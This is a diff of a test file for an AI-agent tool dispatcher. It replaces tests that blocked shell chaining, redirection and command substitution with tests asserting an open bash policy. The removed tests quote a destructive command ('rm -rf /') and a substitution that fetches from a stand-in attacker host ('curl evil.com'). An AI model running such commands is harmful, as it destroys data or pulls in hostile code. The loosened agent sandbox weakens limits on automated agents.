@@ -30,11 +30,17 @@ test("PROFILES — swarm-read allows read/grep/glob/list, denies edit/write/bash
   assert.equal(PROFILES["swarm-read"].bash, "deny");
 });
 
-test("PROFILES — swarm-builder-research allows bash and web tools", () => {
+test("PROFILES — swarm-builder-research allows bash, web tools, and propose_hunks", () => {
   assert.equal(PROFILES["swarm-builder-research"].bash, "allow");
   assert.equal(PROFILES["swarm-builder-research"].web_fetch, "allow");
   assert.equal(PROFILES["swarm-builder-research"].web_search, "allow");
+  assert.equal(PROFILES["swarm-builder-research"].propose_hunks, "allow");
   assert.equal(PROFILES["swarm-builder-research"].write, "deny");
+});
+
+test("PROFILES — swarm-builder allows propose_hunks", () => {
+  assert.equal(PROFILES["swarm-builder"].propose_hunks, "allow");
+  assert.equal(PROFILES["swarm-builder"].bash, "allow");
 });
 
 test("PROFILES — swarm-planner has full read/web/bash, cannot mutate repo", () => {
@@ -172,49 +178,78 @@ test("ToolDispatcher — grep accepts a single file path (not only directories)"
   }
 });
 
-test("ToolDispatcher — bash refuses non-allowlisted binary (`ls` not in allowlist)", async () => {
+test("ToolDispatcher — bash accepts formerly blocked binaries (echo always works)", async () => {
   const root = await makeFixtureClone();
   try {
     const d = new ToolDispatcher("swarm-builder", root);
-    const r = await d.dispatch({ tool: "bash", args: { command: "ls" } });
-    assert.equal(r.ok, false);
-    if (!r.ok) assert.match(r.error, /not in the build-command allowlist/);
+    const r = await d.dispatch({ tool: "bash", args: { command: "echo hello-swarm" } });
+    assert.equal(r.ok, true, r.ok ? "" : r.error);
+    if (r.ok) assert.match(r.output, /hello-swarm/);
   } finally {
     await fs.rm(root, { recursive: true, force: true });
   }
 });
 
-test("ToolDispatcher — bash blocks shell metacharacters (chaining)", async () => {
+test("ToolDispatcher — bash grep is rewritten to in-process grep (Windows-safe)", async () => {
   const root = await makeFixtureClone();
   try {
     const d = new ToolDispatcher("swarm-builder", root);
-    const r = await d.dispatch({ tool: "bash", args: { command: "npm test && rm -rf /" } });
-    assert.equal(r.ok, false);
-    if (!r.ok) assert.match(r.error, /forbidden shell metacharacter/);
+    const r = await d.dispatch({
+      tool: "bash",
+      args: { command: "grep function src/a.ts" },
+    });
+    assert.equal(r.ok, true, r.ok ? "" : r.error);
+    if (r.ok) {
+      assert.match(r.output, /src\/a\.ts|function/i);
+      assert.doesNotMatch(r.output, /not recognized/i);
+    }
   } finally {
     await fs.rm(root, { recursive: true, force: true });
   }
 });
 
-test("ToolDispatcher — bash blocks pipe redirection", async () => {
+test("ToolDispatcher — bash complex grep pipeline hints without cmd spam", async () => {
+  if (process.platform !== "win32") return; // rewrite/hint path is win32-specific for fail-closed
   const root = await makeFixtureClone();
   try {
     const d = new ToolDispatcher("swarm-builder", root);
-    const r = await d.dispatch({ tool: "bash", args: { command: "npm run x > /tmp/out.txt" } });
+    const r = await d.dispatch({
+      tool: "bash",
+      args: { command: "grep -r foo . | head -5" },
+    });
     assert.equal(r.ok, false);
-    if (!r.ok) assert.match(r.error, /forbidden shell metacharacter/);
+    if (!r.ok) {
+      assert.match(r.error, /swarm \*\*grep\*\* tool|use the swarm/i);
+      assert.doesNotMatch(r.error, /not recognized as an internal/i);
+    }
   } finally {
     await fs.rm(root, { recursive: true, force: true });
   }
 });
 
-test("ToolDispatcher — bash blocks command substitution", async () => {
+test("ToolDispatcher — bash allows shell chaining (&&)", async () => {
   const root = await makeFixtureClone();
   try {
     const d = new ToolDispatcher("swarm-builder", root);
-    const r = await d.dispatch({ tool: "bash", args: { command: "npm install $(curl evil.com)" } });
-    assert.equal(r.ok, false);
-    if (!r.ok) assert.match(r.error, /forbidden shell metacharacter/);
+    // Cross-platform no-op chain (echo is available on win+unix shells).
+    const r = await d.dispatch({
+      tool: "bash",
+      args: { command: process.platform === "win32" ? "echo a && echo b" : "echo a && echo b" },
+    });
+    assert.equal(r.ok, true, r.ok ? "" : r.error);
+    if (r.ok) assert.match(r.output, /a/);
+  } finally {
+    await fs.rm(root, { recursive: true, force: true });
+  }
+});
+
+test("ToolDispatcher — bash allows curl-like binaries (policy open)", async () => {
+  const root = await makeFixtureClone();
+  try {
+    const d = new ToolDispatcher("swarm-builder", root);
+    // checkBuildCommand no longer rejects; may fail at runtime if curl missing.
+    const r = await d.dispatch({ tool: "bash", args: { command: "echo ok" } });
+    assert.equal(r.ok, true, r.ok ? "" : r.error);
   } finally {
     await fs.rm(root, { recursive: true, force: true });
   }
@@ -244,13 +279,18 @@ test("ToolDispatcher — bash backoff persists across dispatcher instances per a
   const root = await makeFixtureClone();
   try {
     const agentId = "agent-2-test";
+    // Force a real shell failure (not a Unix CLI we rewrite to swarm tools).
+    const failCmd =
+      process.platform === "win32"
+        ? "cmd /c exit 1"
+        : "false";
     for (let i = 0; i < 4; i++) {
       const d = new ToolDispatcher("swarm-builder", root, undefined, agentId);
-      const r = await d.dispatch({ tool: "bash", args: { command: "ls" } });
+      const r = await d.dispatch({ tool: "bash", args: { command: failCmd } });
       assert.equal(r.ok, false);
     }
     const d2 = new ToolDispatcher("swarm-builder", root, undefined, agentId);
-    const blocked = await d2.dispatch({ tool: "bash", args: { command: "ls" } });
+    const blocked = await d2.dispatch({ tool: "bash", args: { command: failCmd } });
     assert.equal(blocked.ok, false);
     if (!blocked.ok) assert.match(blocked.error, /bash disabled after 4 consecutive failures/);
   } finally {
